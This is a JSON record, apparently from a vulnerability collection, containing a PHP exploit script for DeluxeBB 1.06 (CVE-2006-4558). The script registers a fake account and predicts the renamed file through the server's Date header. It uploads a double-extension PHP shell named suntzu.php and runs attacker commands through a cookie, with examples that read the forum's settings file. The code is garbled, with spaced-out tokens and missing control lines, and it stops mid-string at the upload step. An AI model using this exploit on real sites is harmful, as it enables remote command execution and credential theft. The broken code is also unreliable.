{
    "text": "vul_name : DeluxeBB <= v1.06 attachment mod_mime exploit ， vul_cve : CVE-2006-4558 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"DeluxeBB <= v1.06 attachment mod_mime exploitrn\" ;  ， echo \"by rgod rgod<img src=\"/imgs/at.gif\" border=0 align=middle>autistici.orgrn\" ;  ， echo \"site :  ， echo \"tested & working against a fresh deluxebb installationrnrn\" ;  ， echo \"Usage : php \". $ argv [ 0 ] .\" host path cmd OPTIONSrn\" ;  ， echo \"host : target server ( ip/hostname ) rn\" ;  ， echo \"path : path to deluxebbrn\" ;  ， echo \"cmd : a shell commandrn\" ;  ， echo \"Options : rn\" ;  ， echo \" -p [ port ]  : specify a port other than 80rn\" ;  ， echo \" -P [ ip : port ]  : specify a proxyrn\" ;  ， echo \"Examples : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /deluxebb/ cat ././settings/info.phprn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /deluxebb/ ls -la -p81rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost / ls -la -P1.1.1.1 : 80rnrn\" ;  ， die ;  ， } ， / * explaination :  ， you can upload attachments with double extensions , ex. :  ， test.php.php.rar ， file is renamed like this :  ， test.php.php-1147772503.ext ， and copied to the files/ folder , as you can see , new filename is predictable. ,  ， numbers are the result of time (  ) php function , you have just to synchronize ， clocks through Apache \"Date\" header. ， It seems that Apache mod_mime module considers double-extension files like ， this to be valid PHP files and runs the arbitrary code that has been uploaded ,  ， actually on most versions you can do somethign like this :  ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ， { ， list (  $ usec ,  $ sec ) = explode ( ' ' , microtime (  )  ;  ， } ， { ，  $ temp=explode ( \"Date : \" ,  $ response )  ;  ，  $ temp2=explode ( \"rn\" ,  $ temp [ 1 ]  )  ;  ，  $ is_now= $ temp2 [ 0 ]  ;  ，  $ temp=explode ( \" \" ,  $ is_now )  ;  $ day= $ temp [ 1 ]  ;  $ month= $ temp [ 2 ]  ;  $ year= $ temp [ 3 ]  ;  $ temp2=explode ( \" : \" ,  $ temp [ 4 ]  )  ;  ，  $ hour= $ temp2 [ 0 ]  ;  $ min= $ temp2 [ 1 ]  ;  $ sec= $ temp2 [ 2 ]  ;  ，  $ tb=array ( 'Jan' , '1' , 'Feb' , '2' , 'Mar' , '3' , 'Apr' , '4' , 'May' , '5' , 'Jun' , '6' ,  ， 'Jul' , '7' , 'Aug' , '8' , 'Sep' , '9' , 'Oct' , '10' , 'Nov' , '11' , 'Dec' , '12' )  ;  ， } ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ cmd=\" ;  $ port=80 ;  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { $ cmd.=\" \". $ argv [  $ i ]  ; } ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ，  $ cmd=urlencode (  $ cmd )  ;  ， echo \"step 0 -> Check if suntzu.php is already installedrn\" ;  ，  $ packet =\"GET \". $ p.\"files/suntzu.php HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : cmd=\". $ cmd.\" ; rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ， { ， echo \"Exploit succeeded.\" ;  ，  $ temp=explode ( \"56789\" ,  $ html )  ;  ， die ( \"rn\". $ temp [ 1 ] .\"rn\" )  ;  ， } ， echo \"step 0b -> Synchronize.rn\" ;  ，  $ difftime=0 ;  ， /Unin epoch time by Apache \"Date : \" response header ， /it carries GMT time. sending HEAD request ，  $ packet =\"HEAD / HTTP/1.1rnHost : \". $ host.\"rnConnection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ， { ，  $ itstime=greenwich_timestamp (  $ html )  ;  ， echo \"target host Greenwich timestamp : \". $ itstime.\"rn\" ;  ，  $ mytime=gmtime (  )  ;  ， echo \"my greenwich timestamp : \". $ mytime.\"rn\" ;  ，  $ difftime= $ itstime- $ mytime ;  ， echo \"difftime : \". $ difftime.\"rn\" ;  ， } ， { ， echo \"Unable to read \"Date\" , assuming difftime = 0rn\" ;  ， } ， echo \"step 1 -> Register.rn\" ;  ， srand ( make_seed (  )  ;  ，  $ anumber = rand ( 1 , 99999 )  ;  ，  $ data=\"name=suntzu\". $ anumber ;  ，  $ data.=\"&pass=suntzu\" ;  ，  $ data.=\"&pass2=suntzu\" ;  ，  $ data.=\"&email=suntzu\". $ anumber.\"%40fakemail.com\" ;  ，  $ data.=\"&hideemail=1\" ;  ，  $ data.=\"&languagex=English\" ;  ，  $ data.=\"&xthetimeoffset=2\" ;  ，  $ data.=\"&xthedateformat=d-m-Y\" ;  ，  $ data.=\"&xthetimeformat=24\" ;  ，  $ data.=\"&submit=Register\" ;  ，  $ packet =\"POST \". $ p.\"misc.php?sub=register HTTP/1.0rn\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencodedrn\" ;  ，  $ packet.=\"User-Agent : Googlebot/2.1rn\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"Set-Cookie : \" ,  $ html )  ;  ，  $ cookie=\" ;  ， { ，  $ temp2=explode ( \" \" ,  $ temp [  $ i ]  )  ;  ，  $ cookie.=\" \". $ temp2 [ 0 ]  ;  ， } ， die ( \"Unable to register.\" )  ;  ， } ， echo \"cookie -> \". $ cookie.\"rn\" ;  ， } ， echo \"step 2 -> Post a new thread with the evil attachment.rn\" ;  ，  $ attachment='",
    "time": "2006.09.08"
}